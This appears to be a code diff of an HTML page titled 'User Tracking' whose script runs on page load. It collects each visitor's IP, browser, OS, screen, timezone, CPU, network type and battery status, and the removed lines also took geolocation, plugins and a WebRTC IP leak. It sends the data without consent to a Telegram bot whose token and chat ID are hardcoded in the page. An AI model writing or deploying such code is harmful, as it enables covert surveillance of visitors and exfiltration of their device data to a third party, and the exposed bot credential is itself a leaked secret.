@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,92 +6,60 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>User Tracking</title>
     <script>
-        async function trackUser() {
+        function trackUser() {
             let ip_api = "https://api64.ipify.org?format=json";
 
-            try {
-                let response = await fetch(ip_api);
-                let data = await response.json();
-                let userIP = data.ip;
-                let userAgent = navigator.userAgent;
-                let screenSize = `${screen.width}x${screen.height}`;
-                let referrer = document.referrer || "Direct Visit";
-                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-                // **Extra Info**
-                let deviceName = navigator.platform;
-                let browserName = navigator.userAgentData ? navigator.userAgentData.brands[0].brand : "Unknown";
-                let browserVersion = navigator.userAgent.match(/(chrome|firefox|safari|edge|opera)\/?\s*(\d+)/i) || ["Unknown", "Unknown"];
-                let osName = navigator.userAgent.match(/(Windows|Mac|Linux|Android|iOS)/i) || ["Unknown"];
-                let cpuCores = navigator.hardwareConcurrency || "Unknown";
-                let touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
-                let networkType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-
-                // **Battery Info**
-                let battery = await navigator.getBattery();
-                let batteryLevel = (battery.level * 100) + "%";
-                let chargingStatus = battery.charging ? "Charging" : "Not Charging";
-
-                // **Geolocation (Optional - Requires Permission)**
-                let latitude = "Unknown", longitude = "Unknown";
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(position => {
-                        latitude = position.coords.latitude;
-                        longitude = position.coords.longitude;
-                    });
-                }
-
-                // **Installed Plugins**
-                let plugins = [...navigator.plugins].map(p => p.name).join(", ") || "No Plugins";
-
-                // **WebRTC IP Leak Check**
-                let rtcIP = "Unknown";
-                let rtcConnection = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                rtcConnection.createDataChannel("");
-                rtcConnection.createOffer().then(o => rtcConnection.setLocalDescription(o));
-                rtcConnection.onicecandidate = e => {
-                    if (e.candidate) {
-                        let matches = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-                        if (matches) rtcIP = matches[1];
-                    }
-                };
-
-                // **Page Interaction Time**
-                let startTime = new Date();
-                window.onbeforeunload = function () {
-                    let timeSpent = Math.round((new Date() - startTime) / 1000) + " sec";
+            fetch(ip_api)
+                .then(response => response.json())
+                .then(data => {
+                    let userIP = data.ip;
+                    let userAgent = navigator.userAgent; // Browser details
+                    let screenSize = `${screen.width}x${screen.height}`; // Screen Resolution
+                    let referrer = document.referrer || "Direct Visit"; // Referrer URL
+                    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Timezone
                     
-                    // Construct Telegram message
-                    let message = `New Visitor Detected! 
-                    \nIP: ${userIP} 
-                    \nWebRTC IP: ${rtcIP} 
-                    \nUser-Agent: ${userAgent} 
-                    \nDevice: ${deviceName} 
-                    \nOS: ${osName[0]} 
-                    \nBrowser: ${browserName} ${browserVersion[2]} 
-                    \nScreen: ${screenSize} 
-                    \nReferrer: ${referrer} 
-                    \nTimezone: ${timezone} 
-                    \nCPU Cores: ${cpuCores} 
-                    \nTouch Support: ${touchSupport} 
-                    \nNetwork Type: ${networkType} 
-                    \nBattery: ${batteryLevel} (${chargingStatus}) 
-                    \nGeolocation: ${latitude}, ${longitude} 
-                    \nInstalled Plugins: ${plugins} 
-                    \nTime Spent: ${timeSpent}`;
+                    // **Extra Info**
+                    let deviceName = navigator.platform; // OS Platform
+                    let browserName = navigator.userAgentData ? navigator.userAgentData.brands[0].brand : "Unknown";
+                    let browserVersion = navigator.userAgent.match(/(chrome|firefox|safari|edge|opera)\/?\s*(\d+)/i) || ["Unknown", "Unknown"];
+                    let osName = navigator.userAgent.match(/(Windows|Mac|Linux|Android|iOS)/i) || ["Unknown"];
+                    let cpuCores = navigator.hardwareConcurrency || "Unknown";
+                    let touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
+                    let networkType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
 
-                    let tg_url = `https://api.telegram.org/bot7541518107:AAHKDYJ7w_KMe2In8ozJjtLET8IuW9jKtyY/sendMessage?chat_id=8094522569&text=${encodeURIComponent(message)}`;
-                    fetch(tg_url).catch(error => console.error("Error sending data to Telegram:", error));
-                };
-            } catch (error) {
-                console.error("Error fetching user data:", error);
-            }
+                    // **Battery Info (Async)**
+                    navigator.getBattery().then(function(battery) {
+                        let batteryLevel = (battery.level * 100) + "%";
+                        let chargingStatus = battery.charging ? "Charging" : "Not Charging";
+
+                        // Construct message for Telegram
+                        let message = `New Visitor Detected! 
+                        \nIP: ${userIP} 
+                        \nUser-Agent: ${userAgent} 
+                        \nDevice: ${deviceName} 
+                        \nOS: ${osName[0]} 
+                        \nBrowser: ${browserName} ${browserVersion[2]} 
+                        \nScreen: ${screenSize} 
+                        \nReferrer: ${referrer} 
+                        \nTimezone: ${timezone} 
+                        \nCPU Cores: ${cpuCores} 
+                        \nTouch Support: ${touchSupport} 
+                        \nNetwork Type: ${networkType} 
+                        \nBattery: ${batteryLevel} (${chargingStatus})`;
+
+                        let tg_url = `https://api.telegram.org/bot7541518107:AAHKDYJ7w_KMe2In8ozJjtLET8IuW9jKtyY/sendMessage?chat_id=8094522569&text=${encodeURIComponent(message)}`;
+                        fetch(tg_url)
+                            .then(response => response.json())
+                            .then(data => console.log("Data sent to Telegram:", data))
+                            .catch(error => console.error("Error sending data to Telegram:", error));
+                    });
+                });
         }
 
         window.onload = trackUser;
     </script>
 </head>
 <body>
-    <h2>🖥️</h2>
+    <h2>Tracking User Information...</h2>
 </body>
 </html>
